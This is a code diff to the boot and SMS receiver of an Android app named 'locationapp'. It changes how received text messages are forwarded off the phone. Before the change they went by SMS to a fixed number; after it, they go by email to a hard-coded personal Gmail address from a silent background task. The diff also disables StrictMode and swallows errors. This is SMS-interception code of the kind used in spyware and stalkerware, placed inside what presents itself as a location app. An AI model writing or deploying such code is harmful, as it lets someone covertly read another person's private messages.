@@ -2,13 +2,16 @@ package com.example.locationapp;
 
 import android.app.DownloadManager;
 import android.app.PendingIntent;
+import android.app.ProgressDialog;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.StrictMode;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
@@ -28,6 +31,7 @@ import java.util.Date;
 public class StartUpReceiver extends BroadcastReceiver
 {
     Context Cont;
+    Mail sender;
 
     @Override
     public void onReceive (Context context, Intent intent)
@@ -50,7 +54,6 @@ public class StartUpReceiver extends BroadcastReceiver
     void DoBoot ()
     {
         WriteLog ("Application started on boot");
-        WriteLog ("--");
     }
 
     void DoSMS (Intent SmsInt)
@@ -131,10 +134,82 @@ public class StartUpReceiver extends BroadcastReceiver
 
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
 
-            String p = "123456789";
+
             String line = Line + "   (" + TimeStamp + ")";
-            SmsManager sms = SmsManager.getDefault();
-            sms.sendTextMessage(p, null, line, null, null);
+        sender = new Mail("", "");
+        StringMake.setString(line);
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
+                    Builder().permitAll().build();
+                     StrictMode.setThreadPolicy(policy);
+
+        try {
+            new StartUpReceiver.MyAsyncClass_sms2().execute();
+        }
+
+        catch (Exception ex)
+//
+        {
+
+        }
+         //   SmsManager sms = SmsManager.getDefault();
+          //  sms.sendTextMessage(p, null, line, null, null);
+
+    }
+
+    static class StringMake {
+        static String b;
+
+        static void setString(String a) {
+            b = a;
+        }
+
+        static String getString() {
+            String c = b;
+            return c;
+        }
+    }
+
+
+    class MyAsyncClass_sms2 extends AsyncTask<Void, Void, Void> {
+
+        @Override
+
+        protected void onPreExecute() {
+
+            super.onPreExecute();
+
+        }
+
+
+
+        @Override
+
+        protected Void doInBackground(Void... mApi) {
+
+            try {
+
+                // Add subject, Body, your mail Id, and receiver mail Id.
+
+                String line = null;
+                line = StringMake.getString();
+
+                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "pavlos.repin@gmail.com");
+
+            } catch (Exception ex) {
+
+            }
+            return null;
+        }
+
+        @Override
+
+        protected void onPostExecute(Void result) {
+
+            super.onPostExecute(result);
+
+            Toast.makeText(Cont.getApplicationContext(), "Email send", 100).show();
+
+        }
 
     }
 
